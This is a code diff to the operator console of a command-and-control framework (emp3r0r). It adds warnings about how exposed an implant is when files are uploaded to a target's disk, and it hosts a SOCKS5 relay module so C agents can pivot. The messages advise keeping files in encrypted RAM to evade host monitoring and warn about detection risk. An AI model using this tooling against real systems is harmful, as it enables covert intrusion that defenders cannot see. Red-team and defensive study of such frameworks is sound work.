@@ -303,6 +303,9 @@ func Emp3r0rCommands(app *console.Console) console.Commands {
 
 				src, _ := cmd.Flags().GetString("src")
 				dst, _ := cmd.Flags().GetString("dst")
+				if !strings.HasPrefix(dst, "memfs://") {
+					logging.Warningf("OPSEC: put writes %s directly to the target's disk; the file and its .part temporary are visible to host tooling and file-integrity monitoring (medium risk). Use a memfs:/// path to keep it in encrypted RAM", dst)
+				}
 
 				go func() {
 					err := ftp.UploadToAgent(src, dst, target)
@@ -427,7 +430,11 @@ remote operator:
   tun2socks start --route <target-network>/24
 
 A plain SOCKS5 client can also use the pivot at the WireGuard address, but only
-from inside the tunnel.`,
+from inside the tunnel.
+
+Stealth cost: while the pivot is bound, a C agent polls far more often, keeps
+its message window open longer, and stays unmasked during relays, which raises
+detection risk. The C agent restores its own poll profile on socks_stop.`,
 			Example: "socks_start 1080\n\ttun2socks start --route 10.10.0.0/24",
 			Args:    cobra.MaximumNArgs(1),
 			Run:     socks5StartCmdRun,
@@ -477,9 +484,22 @@ func socks5StartCmdRun(cmd *cobra.Command, args []string) {
 		logging.Errorf("No active agent selected (use `target <id>` first)")
 		return
 	}
+	// A C agent serves the pivot by running the socks5 BOF; host it (and its
+	// loader) for that agent now. The operator experience stays the same: one
+	// socks_start command, exactly as for a Go agent.
+	if err := modules.HostSocks5Relay(agent); err != nil {
+		logging.Errorf("socks_start: %v", err)
+		return
+	}
 	if err := client.StartSocks5Proxy(agent.Tag, port, bind); err != nil {
 		logging.Errorf("socks_start: %v", err)
 		return
+	}
+	if modules.CanRunSocks5BOF(agent) {
+		// The operator must see this here, not only in the C2 log: a pivot
+		// temporarily trades the agent's stealth for latency.
+		logging.Warningf("A C agent needs to poll often for this pivot: until `socks_stop %d` it polls every %ds with a %ds window and stays unmasked while relays run, which raises detection risk; its configured profile is restored on socks_stop",
+			port, def.Socks5PivotPollInterval, def.Socks5PivotPollWindow)
 	}
 	proxyAddr := socks5ProxyHost()
 	if bind != "" && bind != "0.0.0.0" {
